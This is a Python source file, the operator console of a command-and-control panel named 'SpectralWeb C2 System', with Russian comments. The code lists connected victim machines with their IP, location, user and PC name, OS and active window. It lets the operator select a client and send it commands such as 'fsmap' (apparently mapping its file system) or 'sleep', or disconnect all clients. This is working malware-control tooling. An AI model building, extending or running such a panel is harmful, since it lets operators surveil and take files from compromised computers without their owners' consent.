# backend/CLI/CLI.py
import asyncio
from logs import Log as logger
from prompt_toolkit import PromptSession
# ⚡️ Добавляем необходимый импорт для надежного вывода в CLI
from prompt_toolkit.shortcuts import print_formatted_text
from prompt_toolkit.patch_stdout import patch_stdout
# Предполагаем, что Services корректно импортирован
from backend.Services import close_client, close_all_client, list_clients, send_command


# ----------------------------------------------------------------------
# Функция для вывода финальной подсказки
# ----------------------------------------------------------------------
def print_c2_ready_message():
    """Выводит рамку и текст подсказки один раз, используя логгер."""

    prompt_text = (
        "----------------------------------------------------\n"
        "  SpectralWeb C2 System is running on http://127.0.0.1:8001\n"
        "----------------------------------------------------\n"
        "Введите ID клиента или команду:\n"
        "  '0' — выход\n"
        "  'sleep <id>' — отключить клиента\n"
        "  'sleep_all' — отключить всех\n"
        "  'list' — показать подключённых"
    )
    # Выводим подсказку ТОЛЬКО в консоль через print_formatted_text
    print_formatted_text(prompt_text)
    # logger.info(prompt_text) # <-- Закомментировано, чтобы не дублировалось в файле


# ----------------------------------------------------------------------
# Основной интерфейс оператора
# ----------------------------------------------------------------------
async def operator_interface(server):
    session = PromptSession()

    while True:
        with patch_stdout():
            try:
                # Асинхронный ввод команды от пользователя
                selected_str = await session.prompt_async(" >> ")
            except asyncio.CancelledError:
                break  # Выход из цикла при отмене задачи

        selected_str = selected_str.strip()

        # --- Глобальные команды ---
        if selected_str == "0":
            logger.info("[*] Завершение работы. Закрываем соединения...")
            await close_all_client()

            # 1. Отмена основного серверного сокета
            server.close()
            await server.wait_closed()
            logger.info("[*] Сервер завершил работу.")

            # 2. ОТМЕНЯЕМ ВСЕ ОСТАЛЬНЫЕ ЗАДАЧИ В ЦИКЛЕ
            main_loop = asyncio.get_event_loop()
            for task in asyncio.all_tasks(main_loop):
                if task is not asyncio.current_task():
                    task.cancel()

            return

        elif selected_str == "list":
            clients = list_clients()
            output = ""  # Буфер для многострочного вывода

            if not clients:
                logger.info("[!] Нет подключённых клиентов.")
            else:
                # --- 1. ЗАГОЛОВОК СПИСКА ---
                output += "\n[Подключённые клиенты]\n"

                # --- 2. ШАПКА ТАБЛИЦЫ ---
                header = (
                    f"{'ID':<15} | {'IP':<15} | {'LAST ACTIVE':<20} | "
                    f"{'LOC':<10} | {'USER@PC':<25} | {'OS/ARCH':<15} | ACTIVE WINDOW"
                )
                output += header + "\n"

                # --- 3. ВЫВОД КЛИЕНТОВ ---
                for info in clients:
                    user_pc = f"{info.get('user', 'N/A')}@{info.get('pc_name', 'N/A')}"
                    os_arch = f"{info.get('os', 'N/A')}/{info.get('arch', 'N/A')}"

                    # Используем ИСПРАВЛЕННЫЙ ключ 'last_active'
                    output_line = (
                        f"{info['id']:<15} | "
                        f"{info['ip']:<15} | "
                        f"{info.get('last_active', 'N/A'):<20} | "
                        f"{info['loc']:<10} | "
                        f"{user_pc:<25.25} | "
                        f"{os_arch:<15} | "
                        f"{info['activeWindow']}"
                    )
                    output += output_line + "\n"

            # ⚡️ КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ: Вывод через print_formatted_text
            # Это самый надежный способ вывода многострочного текста в prompt_toolkit
            if output:
                # Используем обычный print/print_formatted_text, чтобы избежать ошибки Vt100
                # patch_stdout() гарантирует, что вывод не сломает строку ввода.
                print_formatted_text(output)


        elif selected_str.startswith("sleep "):
            cid = selected_str[6:].strip()
            if await close_client(cid):
                logger.info(f"[*] Клиент {cid} отключён.")
            else:
                logger.warning(f"[!] Клиент с ID '{cid}' не найден.")

        elif selected_str == "sleep_all":
            count = await close_all_client()
            logger.info(f"[*] Все клиенты отключены. ({count} клиентов)")

        # --- Вход в режим отдельного клиента ---
        elif selected_str in [c["id"] for c in list_clients()]:
            cid = selected_str
            logger.info(f"[*] Вход в режим клиента {cid}. Поддерживаемые команды: fsmap, sleep, back")

            while True:
                current_clients = [c["id"] for c in list_clients()]
                if cid not in current_clients:
                    logger.info(f"[!] Клиент {cid} отключился. Возвращаемся в глобальный режим.")
                    break

                with patch_stdout():
                    cmd = await session.prompt_async(f"[{cid}] client> ")
                cmd = cmd.strip()

                if cmd == "back":
                    logger.info("[*] Возвращаемся в глобальный режим.")
                    break

                elif cmd in ("sleep", "fsmap"):
                    success = await send_command(cid, cmd)
                    if success:
                        logger.info(f"[*] Команда '{cmd}' отправлена клиенту {cid}.")
                    else:
                        logger.warning(f"[!] Не удалось отправить '{cmd}' клиенту {cid}.")
                    if cmd == "sleep":
                        await close_client(cid)
                        break
                else:
                    logger.warning("[!] Неизвестная команда. Поддерживаемые: fsmap, sleep, back")

        # --- Все остальные случаи: неизвестная команда или несуществующий ID ---
        else:
            logger.warning(f"[!] Неизвестная команда или клиент с ID '{selected_str}' не найден")
